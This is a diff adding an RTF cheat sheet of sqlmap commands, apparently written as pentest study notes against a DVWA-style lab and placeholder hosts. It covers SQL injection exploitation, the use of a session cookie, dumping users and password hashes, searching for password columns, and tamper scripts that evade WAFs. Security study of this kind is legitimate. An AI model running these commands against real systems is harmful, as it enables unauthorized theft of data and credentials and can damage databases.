@@ -1,0 +1,310 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fswiss\fcharset0 ArialMT;\f2\fmodern\fcharset0 Courier;
+}
+{\colortbl;\red255\green255\blue255;\red244\green244\blue244;\red52\green52\blue52;\red0\green255\blue0;
+\red0\green0\blue255;}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid1}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}}
+\paperw11900\paperh16840\margl1440\margr1440\vieww19560\viewh12640\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs36 \cf0 \ul \ulc0 SQLMAP
+\b0\fs24 \ulnone \
+
+\fs28 \
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls1\ilvl0
+\f1 \cf0 \cb2 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+To scan web application for SQL injection vulnerability\cb1 \
+\ls1\ilvl0\cb2 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+To exploit SQL injection vulnerability\cb1 \
+\ls1\ilvl0\cb2 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+To extract the database and database user details completely\cb1 \
+\ls1\ilvl0\cb2 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+To bypass a Web Application Firewall (WAF) using tamper scripts\cb1 \
+\ls1\ilvl0\cb2 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+To own the underlying operating system i.e. gain the operating system access and run OS level commands.\
+\pard\tx566\pardeftab720\partightenfactor0
+
+\f0 \cf0 \cb1 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\fs26 \cf3 \expnd0\expndtw0\kerning0
+Specifically in this case sqlmap managed to enumerate the database successfully and to extract data from the database tables very fast.\
+Of course it has many more capabilities like that it can check for the existence of WAF (Web Application Firewall),IDS and IPS as well as that it can execute operating systems commands.\
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs28 \cf0 \kerning1\expnd0\expndtw0 \
+The attacker must provide the exact URL for sqlmap to attack   -> http://example.com/index.php?id=51\
+\
+\pard\pardeftab720\partightenfactor0
+\cf4 \cb0 python sqlmap.py -u \'93http://example.com/index.php?id=51&Submit=Submit#\'94\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \
+If you know the vulnerable sqlparameter give it to sqlmap to save time (-p):\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2\fs32 \cf4 \cb0 \expnd0\expndtw0\kerning0
+python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" -p id\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\f0\fs28 \cf0 \cb1 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+\cf5 \expnd0\expndtw0\kerning0
+The sqlmap will discover that the database that is running from behind the application is MySQL, the operating system, the web application technology, the version of MySQL and of course the number and the database names that exists.\
+\pard\pardeftab720\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+\cf4 \cb0 python sqlmap.py -u \'93http://example.com/index.php?id=51&Submit=Submit#\'94  >> out.txt\
+\pard\pardeftab720\partightenfactor0
+\cf0 \cb1 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \ul SQLMAP With Authentication
+\b0\fs28 \ulnone \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+To make an sqlmap run 
+\b when the site uses authentication
+\b0  you are going to use the COOKIE too!!\
+\
+1) So you have found the url you want to check	->	http://example.com/index.php?id=51\
+\
+2) Then you need to specify the cookie - So run Burp suite to find that information  ->  - - cookie=\'93PHPSESSID=\'85\'94\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf4 \cb0 example
+\b0  python sqlmap.py -u \'93http://example.com/index.php?id=51\'94 - -cookie=\'93PHPSESSID=wknf24r24nn3gn3; security=low\'94 - -dbs\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \ul SQLMAP Commands
+\b0\fs28 \ulnone \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf5 - -dbs 
+\b0 \cf0   will find all databases\
+
+\b \cf5 -f 
+\b0 \cf0          will fingerprint the database and knowing the version of the DB allows us to search for known vulns that the version has\
+
+\b \cf5 -b
+\b0 \cf0          will give us the banner and the DB version again\
+\
+
+\b \cf5 - -current-user\cf0  
+\b0     will return DB current user\
+
+\b \cf5 - -is-dba	
+\b0 \cf0 	      will return if the user is the dba\
+
+\b \cf5 - -current-db
+\b0 \cf0 	      will return current database			\
+
+\b \cf5 - -hostname
+\b0 \cf0 	      will return hostname\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf4 \cb0 example
+\b0  python sqlmap.py -u \'93http://example.com/index.php?id=51\'94 - -cookie=\'93PHPSESSID=wknf24r24nn3gn3; security=low\'94 - -current-user - -is-dba - -current-db - -hostname\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\fs26 \cf3 \expnd0\expndtw0\kerning0
+Find the users and their password hashes as well as and their privileges and roles that they have on the database.\
+This is very important because we can use this kind of information to access the database directly in case that we can crack the hashes.
+\f0\fs28 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\i\b\fs26 \cf5 \expnd0\expndtw0\kerning0
+- -users 		
+\i0\b0 \cf0 will print all the users of the db
+\i\b \cf5 	\
+- -passwords        
+\i0\b0 \cf0 will print all the passwords, probably hashes, of the db
+\i\b \cf5 	\
+- -privileges          
+\i0\b0 \cf0 will print privileges
+\i\b \cf5 \
+- -roles                  
+\i0\b0 \cf0 will print roles of users
+\f0\fs28 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf4 \cb0 example
+\b0  python sqlmap.py -u \'93http://example.com/index.php?id=51\'94 - -cookie=\'93PHPSESSID=wknf24r24nn3gn3; security=low\'94 - -users - -passwords - -privileges - -roles \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\i\b\fs26 \cf5 \expnd0\expndtw0\kerning0
+- -tables      
+\i0\b0 \cf0 will enumerate all the tables of the databases
+\i\b \cf5 		\
+- -columns  
+\i0\b0 \cf0 will print all the columns of the tables
+\i\b \cf5 		\
+- -dump       
+\i0\b0 \cf0 will print the data that the columns contain
+\i\b \cf5 			\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\f0\i0\b0\fs28 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\i\b\fs26 \cf5 \expnd0\expndtw0\kerning0
+- -tables -D dvwa       		
+\i0\b0 \cf0 will print the table that database \'93dvwa\'94 contains\
+
+\i\b \cf5 - -columns -D dvwa -T users   	
+\i0\b0 \cf0 will print the columns that table \'93users\'94 in database \'93dvwa\'94 contains
+\i\b \cf5 	\
+- -dump -D dvwa -T users   	
+\i0\b0 \cf0 will print the data that table \'93users\'94 in database \'93dvwa\'94 contains\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs32 \cf0 This will cause sqlmap to output a list of databases, tables, or columns as appropriate and you can select a specific one by using -D, -T and -C. However to cause it to actually extract rows from the database you need to give it the dump option. \
+So once you\'92ve chosen a target you can go ahead and dump data like this:\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" -D mainapp -T tblUsers -C username,password --dump
+\f1\i\b\fs26 						
+\f0\i0\b0\fs28 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+
+\f1\i\b\fs26 \cf5 \cb1 \expnd0\expndtw0\kerning0
+	\
+- -threads       		
+\i0\b0 \cf0 make it go faster - increase speed through threading\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2\fs32 \cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" -D mainapp -T tblUsers -C username,password --dump --threads 10\
+\pard\pardeftab720\partightenfactor0
+
+\f1\fs26 \cf0 \cb1 \
+
+\i\b \cf5 				
+\f0\i0\b0\fs28 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \ul HARD SQLMAP Commands
+\b0\fs28 \ulnone \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\fs32 \cf0 \expnd0\expndtw0\kerning0
+By default SQLmap will try to determine an injection point quickly and use the most common and safest options available to it, \
+if you want it to try a little harder you can supply a level to increase the number of payloads it attempts and you can supply a risk to include more risky options such as benchmark(), whilst this may uncover an injection point it\'92ll also hurt the database a little bit and will potentially make it unavailable to legitimate users. \
+\
+There are five levels of additional payloads and three levels of risk:\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f1\i\b\fs26 \cf5 - -level 5       	
+\i0\b0 \cf0 provide the level of attack 1 to 5\
+
+\i\b \cf5 - -risk 3	   	
+\i0\b0 \cf0 provide the level of risk 1 to 3 \'97 Might hurt the DB
+\i\b \cf5 	\
+\pard\pardeftab720\partightenfactor0
+
+\f0\i0\b0\fs32 \cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" --level 5 --risk 3
+\f0\fs28 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \ul Limit Types of Injection
+\b0\fs28 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\fs32 \cf0 \expnd0\expndtw0\kerning0
+\
+Additionally you can limit the types of injection that sqlmap uses by using the technique option, to limit it to Boolean, Error, Union, Stacked, Timed or some combination of those:\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" --technique E
+\f0\fs28 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \cb1 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \expnd0\expndtw0\kerning0
+\ul Automate Searching the Database\
+\pard\pardeftab720\partightenfactor0
+
+\b0\fs32 \cf0 \ulnone \
+If your target database is too large, or your extraction speed is too low to run a full enumeration you can quickly search for a useful column using the search option, \
+so to look for columns such as pass, passwd, passcode and password you could use the following search command:\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf0 \
+\pard\pardeftab720\partightenfactor0
+\cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" -C pass --search\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf0 \cb1 \
+It\'92ll prompt you to see if you want to search for columns that exactly match \'93pass\'94 or simply have \'93pass\'94 in them (such as password).
+\fs28 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs36 \cf0 \expnd0\expndtw0\kerning0
+\ul Filter Evasion: Tamper Scripts  SOS SOS\
+\pard\pardeftab720\partightenfactor0
+
+\b0\fs32 \cf0 \ulnone \
+If your target application is protected by simple user input filtering, sqlmap can also automate filter evasion through the user of \'93tamper scripts\'94 these take the standard payloads it would normally use and modify them before sending them. \
+\
+For example if your target application filters the word \'93UNION\'94 and \'93union\'94 you could potentially bypass this by changing the request to \'93unIOn\'94 (yeah flipping case like this is surprisingly effective against naive\'a0filters!) or perhaps whitespace is filtered \'96 then you can bypass this filter by using comments, which are the equivalent in many SQL contexts. \
+You can apply these scripts\'a0like this:\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf4 \cb0 python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" --tamper randomcase\
+python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10" --tamper space2comments
+\f0\fs28 \cf0 \cb1 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf0 \ul References
+\b0 \ulnone \
+\
+https://www.gracefulsecurity.com/introduction-to-sqlmap/\
+}
